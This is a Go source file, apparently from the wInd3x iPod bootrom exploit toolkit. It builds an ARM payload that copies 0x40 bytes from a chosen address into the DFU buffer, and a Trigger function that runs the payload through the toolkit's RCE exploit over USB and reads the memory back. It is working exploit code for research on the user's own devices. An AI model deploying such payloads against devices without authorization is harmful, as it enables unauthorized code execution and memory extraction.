package dumpmem

import (
	"bytes"
	"encoding/binary"
	"fmt"

	"github.com/google/gousb"

	"github.com/freemyipod/wInd3x/pkg/dfu"
	"github.com/freemyipod/wInd3x/pkg/exploit"
	"github.com/freemyipod/wInd3x/pkg/uasm"
)

// Payload creates a payload which:
// - loads 32 bits from the DFU buffer and interprets is as a src addr
// - loads 0x40 bytes from the src addr and copies them to the DFU
//   buffer
func Payload(ep *exploit.Parameters) ([]byte, error) {
	payload := uasm.Program{
		Address: ep.ExecAddr,
		Listing: []uasm.Statement{
			// Load offset
			uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(ep.DFUBufAddr)},
			uasm.Ldr{Dest: uasm.R1, Src: uasm.Deref(uasm.R0, 0)},

			// Copy 0x40 bytes from R1 to R0.
			uasm.Mov{Dest: uasm.R2, Src: uasm.Immediate(0)},

			uasm.Label("loop"),
			uasm.Ldrb{Dest: uasm.R3, Src: uasm.Deref(uasm.R1, 0)},
			uasm.Strb{Src: uasm.R3, Dest: uasm.Deref(uasm.R0, 0)},
			uasm.Add{Dest: uasm.R0, Src: uasm.R0, Compl: uasm.Immediate(1)},
			uasm.Add{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.Immediate(1)},
			uasm.Add{Dest: uasm.R2, Src: uasm.R2, Compl: uasm.Immediate(1)},
			uasm.Cmp{A: uasm.R2, B: uasm.Immediate(0x40)},
			uasm.B{Cond: uasm.NE, Dest: uasm.LabelRef("loop")},

			// Fixup LR (after trampoline blx messes it up)
			uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(ep.ReturnAddr)},
			uasm.Bx{Dest: uasm.LR},
		},
	}

	return payload.Assemble(), nil
}

func Trigger(usb *gousb.Device, ep *exploit.Parameters, addr uint32) ([]byte, error) {
	if err := dfu.Clean(usb); err != nil {
		return nil, fmt.Errorf("clean failed: %w", err)
	}
	payload, err := Payload(ep)
	if err != nil {
		return nil, fmt.Errorf("failed to generate payload: %w", err)
	}

	addrBuf := bytes.NewBuffer(nil)
	binary.Write(addrBuf, binary.LittleEndian, addr)
	if err := exploit.RCE(usb, ep, payload, addrBuf.Bytes()); err != nil {
		return nil, fmt.Errorf("failed to execute dump payload: %w", err)
	}

	resBuf := make([]byte, 0x40)
	n, err := usb.Control(0xa1, uint8(dfu.RequestUpload), 0, 0, resBuf)
	if err != nil {
		return nil, fmt.Errorf("failed to read data: %w", err)
	}
	if n != 0x40 {
		return nil, fmt.Errorf("only got %x bytes", n)
	}

	return resBuf, nil
}
